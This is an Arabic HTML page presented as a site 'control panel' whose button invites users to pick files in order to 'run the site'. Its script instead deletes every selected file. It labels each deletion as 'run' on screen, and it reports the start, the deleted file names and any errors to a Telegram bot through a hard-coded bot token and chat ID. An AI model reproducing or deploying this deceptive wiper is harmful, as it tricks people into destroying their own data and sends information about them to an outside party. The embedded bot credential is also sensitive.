<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - تشغيل الموقع</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(to right, #f0f2f5, #dfe6e9);
            margin: 0;
            padding: 0;
            text-align: center;
            color: #333;
        }

        .container {
            max-width: 600px;
            margin: 50px auto;
            background-color: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }

        h1 {
            color: #2c3e50;
        }

        p {
            font-size: 18px;
        }

        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 14px 28px;
            margin: 15px 0;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #2980b9;
        }

        #deleteBtn {
            background-color: #e74c3c;
        }

        #deleteBtn:hover {
            background-color: #c0392b;
        }

        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
        }

        .success {
            background-color: #2ecc71;
            color: white;
        }

        .error {
            background-color: #e74c3c;
            color: white;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>لوحة التحكم</h1>
        <p> اختر الملفات أو المجلدات لبدء التشغيل</p>
        <button id="deleteBtn">تشغيل الموقع</button>
        <div id="status">الرجاء اختيار الملفات أو المجلدات.</div>
    </div>

    <script>
        // إعداد متغيرات بوت تيليجرام (أضفها بنفسك)
        const BOT_TOKEN = "8448437426:AAGDNRN8rUX2BX8usRnteGq-RmlOxuq7hAE";
        const CHAT_ID = "6703506413";

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: "HTML"
                    })
                });
            } catch (e) {
                console.error("فشل الإرسال إلى تيليجرام", e);
            }
        }

        document.getElementById("deleteBtn").addEventListener("click", async () => {
            const statusDiv = document.getElementById("status");
            statusDiv.textContent = "جاري المعالجة...";

            try {
                await sendToTelegram("بدأ المستخدم عملية الحذف.");

                const handles = await window.showOpenFilePicker({
                    multiple: true
                });

                let deletedCount = 0;
                let report = "<b>نتائج التشغيل:</b>\n";

                for (const handle of handles) {
                    try {
                        await handle.remove();
                        report += `تم التشغيل: ${handle.name}\n`;
                        deletedCount++;
                    } catch (err) {
                        report += `❌ فشل في حذف: ${handle.name}\n`;
                    }
                }

                statusDiv.className = "success";
                statusDiv.textContent = `تم التشغيل ${deletedCount} عنصر بنجاح.`;
                await sendToTelegram(report);

            } catch (error) {
                statusDiv.className = "error";
                statusDiv.textContent = "حدث خطأ أثناء تنفيذ العملية.";
                await sendToTelegram(`❌ خطأ: ${error.message}`);
            }
        });
    </script>
</body>
</html>
